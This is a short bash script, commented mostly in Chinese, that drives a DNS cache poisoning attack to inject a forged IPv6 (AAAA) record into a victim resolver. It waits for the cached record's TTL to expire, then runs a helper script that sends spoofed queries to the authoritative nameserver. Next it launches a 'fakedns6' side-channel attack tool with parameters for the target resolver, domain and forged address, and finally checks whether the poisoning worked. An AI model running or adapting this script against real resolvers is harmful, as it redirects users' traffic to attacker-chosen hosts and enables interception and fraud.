# 目前仅考虑篡改或注入AAAA记录
# $1 for victim resolver IP, $2 想要篡改的IPv6地址结果, $3 for iface name, $4 for victim domain name, $5 for victim domain nameserver IP
# Please run with sudo.

# Verify the existing record domain, just for proof purposes.
echo '获取原记录中:'
dig @$1 $4 AAAA
sleeptime=0
sleeptime=`dig @$1 $4 AAAA | grep -o -P '[0-9]+[ \t]*IN' | head -n 1 | sed 's/IN//g'`

echo "等待缓存过期,$sleeptime 秒之后开始攻击..."
sleep $sleeptime

echo "开始攻击"
echo "攻击参数："
echo "目标域名权威服务地址:$5"
echo "目标解析服务地址:$1"
echo "目标域名:$4"

# 伪造目标服务IPv6地址向权威服务器发送大量查询 [权威][目标IP][目标域名][网络接口]
bash ./dns_query.sh $5 $1 $4 $3

# 开始攻击
# Change the argument accordingly
echo "执行侧信道攻击脚本中"
./fakedns6 -a=$5 -b=$1 -i=$3 -n=$4 -r=$1 -t 50000 -ad=$2 -tg 0 -s 10000 -e 65000 -j 0 -d=true


  # Validations
echo "攻击结束"
dig @$1 $4 AAAA

sleeptime=`dig @$1 $4 AAAA | grep -o -P '[0-9]+[ \t]*IN' | head -n 1 | sed 's/IN//g'`
echo '如果结果未改变, 需要等待原缓存过期. 或者按 Ctrl-C取消攻击.'

echo '等待两秒...'
sleep 2
dig @$1 $4 AAAA
